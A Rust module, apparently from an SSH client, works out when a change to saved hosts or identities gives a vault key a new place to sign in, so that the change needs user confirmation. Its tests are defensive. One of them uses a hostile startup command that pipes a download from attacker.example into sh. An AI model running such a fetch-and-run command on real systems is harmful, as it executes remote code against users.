//! Where the saved hosts let a vault key sign in.
//!
//! A host that authenticates with a vault key is a standing permission: connect
//! to this server, as this account, with this key, and run this command on
//! arrival. The store is written from the webview, so a write that grants a new
//! one of those permissions is something the user has to confirm outside the
//! page. This module decides which writes do, by comparing what the store
//! allows before and after.

use crate::connection::credentials;
use crate::host::{AuthMethod, Host};
use crate::identity::Identity;
use crate::store::StoreData;
use std::collections::HashSet;
use uuid::Uuid;

/// One place a vault key signs in to, and what runs there once it has.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct KeyReach {
    pub key_id: Uuid,
    pub username: String,
    pub hostname: String,
    pub port: u16,
    /// `None` when nothing runs. An empty command is never sent, so it is the
    /// same as none.
    pub startup_command: Option<String>,
}

impl KeyReach {
    /// What `host` lets a vault key do, resolved the way a connection resolves
    /// it. `None` when the host does not sign in with a vault key: password
    /// auth, agent auth, public-key auth with no key chosen, or a link to an
    /// identity that is not stored, which a connection refuses.
    pub fn of(host: &Host, identity: Option<&Identity>) -> Option<Self> {
        let resolved = credentials(host, identity).ok()?;
        if *resolved.auth != AuthMethod::PublicKey {
            return None;
        }
        Some(Self {
            key_id: resolved.key_id?,
            username: resolved.username.to_owned(),
            hostname: host.hostname.clone(),
            port: host.port,
            startup_command: host
                .startup_command
                .clone()
                .filter(|command| !command.is_empty()),
        })
    }
}

/// A saved host that would let a vault key do something no saved host lets it
/// do yet.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NewReach {
    pub host_id: Uuid,
    pub host_label: String,
    pub reach: KeyReach,
}

fn reaches(data: &StoreData) -> impl Iterator<Item = (&Host, KeyReach)> {
    data.hosts
        .iter()
        .filter_map(move |host| Some((host, KeyReach::of(host, data.linked_identity(host))?)))
}

/// Every key reach `after` holds that `before` does not, in host order.
///
/// The comparison is against everything `before` allows, not against the same
/// host's previous record. A new host that copies an existing one adds nothing
/// the user has not already allowed, while an edit to one identity is checked
/// on every host that links it, and a removed identity is checked on every
/// host that falls back to its own key. Any field that feeds the reach —
/// hostname, port, account, auth method, key, identity link, startup command —
/// is covered without being listed, because the reach is computed rather than
/// diffed field by field.
///
/// Every stored host is considered, including a second record under an id
/// already in use, so what is reported is never less than what a connection can
/// reach.
pub fn introduced(before: &StoreData, after: &StoreData) -> Vec<NewReach> {
    let allowed: HashSet<KeyReach> = reaches(before).map(|(_, reach)| reach).collect();
    let mut listed = HashSet::new();
    reaches(after)
        .filter(|(host, reach)| !allowed.contains(reach) && listed.insert((host.id, reach.clone())))
        .map(|(host, reach)| NewReach {
            host_id: host.id,
            host_label: host.label.clone(),
            reach,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn key_host(label: &str, hostname: &str, key: Uuid) -> Host {
        let mut host = Host::new(label, hostname, 22, "deploy");
        host.auth = AuthMethod::PublicKey;
        host.key_id = Some(key);
        host
    }

    fn password_host(label: &str, hostname: &str) -> Host {
        let mut host = Host::new(label, hostname, 22, "deploy");
        host.auth = AuthMethod::Password {
            credential_key: "default".into(),
        };
        host
    }

    fn key_identity(key: Uuid) -> Identity {
        let mut identity = Identity::new("ops", "root");
        identity.auth = AuthMethod::PublicKey;
        identity.key_id = Some(key);
        identity
    }

    fn after(before: &StoreData, edit: impl FnOnce(&mut StoreData)) -> StoreData {
        let mut next = before.clone();
        edit(&mut next);
        next
    }

    fn hostnames(found: &[NewReach]) -> Vec<&str> {
        found.iter().map(|r| r.reach.hostname.as_str()).collect()
    }

    #[test]
    fn adding_a_key_host_introduces_its_reach() {
        let key = Uuid::new_v4();
        let before = StoreData::default();
        let mut host = key_host("evil", "attacker.example", key);
        host.startup_command = Some("curl attacker.example/x | sh".into());
        let after = after(&before, |d| d.add_host(host.clone()));

        let found = introduced(&before, &after);
        assert_eq!(found.len(), 1);
        assert_eq!(found[0].host_id, host.id);
        assert_eq!(found[0].host_label, "evil");
        assert_eq!(
            found[0].reach,
            KeyReach {
                key_id: key,
                username: "deploy".into(),
                hostname: "attacker.example".into(),
                port: 22,
                startup_command: Some("curl attacker.example/x | sh".into()),
            }
        );
    }

    #[test]
    fn hosts_that_use_no_vault_key_introduce_nothing() {
        let before = StoreData::default();
        let mut agent = Host::new("agent", "a.example", 22, "deploy");
        agent.startup_command = Some("id".into());
        let mut keyless = key_host("keyless", "k.example", Uuid::new_v4());
        keyless.key_id = None;
        // A key id left behind on a password host is not used by anything.
        let mut stale = password_host("stale", "s.example");
        stale.key_id = Some(Uuid::new_v4());

        let after = after(&before, |d| {
            d.add_host(password_host("password", "p.example"));
            d.add_host(agent);
            d.add_host(keyless);
            d.add_host(stale);
        });
        assert!(introduced(&before, &after).is_empty());
    }

    #[test]
    fn an_edit_that_leaves_the_reach_alone_introduces_nothing() {
        let host = key_host("prod", "prod.example", Uuid::new_v4());
        let before = after(&StoreData::default(), |d| d.add_host(host.clone()));

        let mut renamed = host.clone();
        renamed.label = "production".into();
        renamed.tags = vec!["web".into()];
        renamed.group_id = Some(Uuid::new_v4());
        let after = after(&before, |d| d.update_host(renamed));
        assert!(introduced(&before, &after).is_empty());
    }

    #[test]
    fn each_field_that_feeds_the_reach_is_caught() {
        let host = key_host("prod", "prod.example", Uuid::new_v4());
        let before = after(&StoreData::default(), |d| d.add_host(host.clone()));

        type Edit = fn(&mut Host);
        let edits: [(&str, Edit); 5] = [
            ("hostname", |h| h.hostname = "attacker.example".into()),
            ("port", |h| h.port = 2222),
            ("username", |h| h.username = "root".into()),
            ("key", |h| h.key_id = Some(Uuid::new_v4())),
            ("startup command", |h| h.startup_command = Some("id".into())),
        ];
        for (field, edit) in edits {
            let mut changed = host.clone();
            edit(&mut changed);
            let after = after(&before, |d| d.update_host(changed));
            assert_eq!(
                introduced(&before, &after).len(),
                1,
                "{field} change was missed"
            );
        }
    }

    #[test]
    fn switching_a_host_from_password_to_its_stored_key_is_caught() {
        // The key id and hostname never change, only the method that decides
        // whether the key is used at all.
        let mut host = password_host("drop", "attacker.example");
        host.key_id = Some(Uuid::new_v4());
        let before = after(&StoreData::default(), |d| d.add_host(host.clone()));

        let mut switched = host.clone();
        switched.auth = AuthMethod::PublicKey;
        let after = after(&before, |d| d.update_host(switched));
        assert_eq!(
            hostnames(&introduced(&before, &after)),
            ["attacker.example"]
        );
    }

    #[test]
    fn an_empty_startup_command_is_the_same_as_none() {
        let host = key_host("prod", "prod.example", Uuid::new_v4());
        let before = after(&StoreData::default(), |d| d.add_host(host.clone()));
        let mut emptied = host.clone();
        emptied.startup_command = Some(String::new());
        let after = after(&before, |d| d.update_host(emptied));
        assert!(introduced(&before, &after).is_empty());
    }

    #[test]
    fn a_copy_of_an_allowed_host_introduces_nothing() {
        let host = key_host("prod", "prod.example", Uuid::new_v4());
        let before = after(&StoreData::default(), |d| d.add_host(host.clone()));
        let mut copy = host.clone();
        copy.id = Uuid::new_v4();
        copy.label = "prod (copy)".into();
        let after = after(&before, |d| d.add_host(copy));
        assert!(introduced(&before, &after).is_empty());
    }

    #[test]
    fn changing_an_identity_key_is_reported_on_every_host_that_links_it() {
        let identity = key_identity(Uuid::new_v4());
        let mut web = password_host("web", "web.example");
        web.identity_id = Some(identity.id);
        let mut db = password_host("db", "db.example");
        db.identity_id = Some(identity.id);
        let unrelated = key_host("other", "other.example", Uuid::new_v4());
        let before = after(&StoreData::default(), |d| {
            d.add_identity(identity.clone());
            d.add_host(web);
            d.add_host(db);
            d.add_host(unrelated);
        });

        let new_key = Uuid::new_v4();
        let mut rekeyed = identity.clone();
        rekeyed.key_id = Some(new_key);
        let after = after(&before, |d| d.update_identity(rekeyed));

        let found = introduced(&before, &after);
        assert_eq!(hostnames(&found), ["web.example", "db.example"]);
        assert!(found
            .iter()
            .all(|r| r.reach.key_id == new_key && r.reach.username == "root"));
    }

    #[test]
    fn an_identity_that_starts_using_a_key_is_caught() {
        let mut identity = key_identity(Uuid::new_v4());
        identity.auth = AuthMethod::Password {
            credential_key: "default".into(),
        };
        let mut host = password_host("web", "web.example");
        host.identity_id = Some(identity.id);
        let before = after(&StoreData::default(), |d| {
            d.add_identity(identity.clone());
            d.add_host(host);
        });

        let mut switched = identity.clone();
        switched.auth = AuthMethod::PublicKey;
        let after = after(&before, |d| d.update_identity(switched));
        assert_eq!(hostnames(&introduced(&before, &after)), ["web.example"]);
    }

    #[test]
    fn adding_the_identity_a_host_already_names_is_caught() {
        // A link to an identity that is not stored reaches nothing, because a
        // connection refuses it. Storing that identity afterwards is what
        // gives the host its key.
        let identity = key_identity(Uuid::new_v4());
        let mut host = password_host("drop", "attacker.example");
        host.identity_id = Some(identity.id);
        let before = after(&StoreData::default(), |d| d.add_host(host));
        assert!(introduced(&StoreData::default(), &before).is_empty());

        let after = after(&before, |d| d.add_identity(identity));
        assert_eq!(
            hostnames(&introduced(&before, &after)),
            ["attacker.example"]
        );
    }

    #[test]
    fn removing_an_identity_is_caught_when_a_host_falls_back_to_its_own_key() {
        let mut identity = key_identity(Uuid::new_v4());
        identity.auth = AuthMethod::Password {
            credential_key: "default".into(),
        };
        let mut host = key_host("drop", "attacker.example", Uuid::new_v4());
        host.identity_id = Some(identity.id);
        let before = after(&StoreData::default(), |d| {
            d.add_identity(identity.clone());
            d.add_host(host);
        });
        assert!(introduced(&StoreData::default(), &before).is_empty());

        let after = after(&before, |d| d.remove_identity(identity.id));
        assert_eq!(
            hostnames(&introduced(&before, &after)),
            ["attacker.example"]
        );
    }

    #[test]
    fn removing_an_identity_whose_settings_the_host_mirrors_introduces_nothing() {
        // The host form copies the identity's username, auth and key onto the
        // host, so falling back to them reaches exactly what the link did.
        let key = Uuid::new_v4();
        let identity = key_identity(key);
        let mut host = key_host("web", "web.example", key);
        host.username = "root".into();
        host.identity_id = Some(identity.id);
        let before = after(&StoreData::default(), |d| {
            d.add_identity(identity.clone());
            d.add_host(host);
        });
        let after = after(&before, |d| d.remove_identity(identity.id));
        assert!(introduced(&before, &after).is_empty());
    }

    #[test]
    fn a_second_record_under_a_used_id_is_still_checked() {
        let host = key_host("prod", "prod.example", Uuid::new_v4());
        let before = after(&StoreData::default(), |d| d.add_host(host.clone()));
        let mut shadow = key_host("prod", "attacker.example", host.key_id.unwrap());
        shadow.id = host.id;
        let after = after(&before, |d| d.add_host(shadow));
        assert_eq!(
            hostnames(&introduced(&before, &after)),
            ["attacker.example"]
        );
    }
}
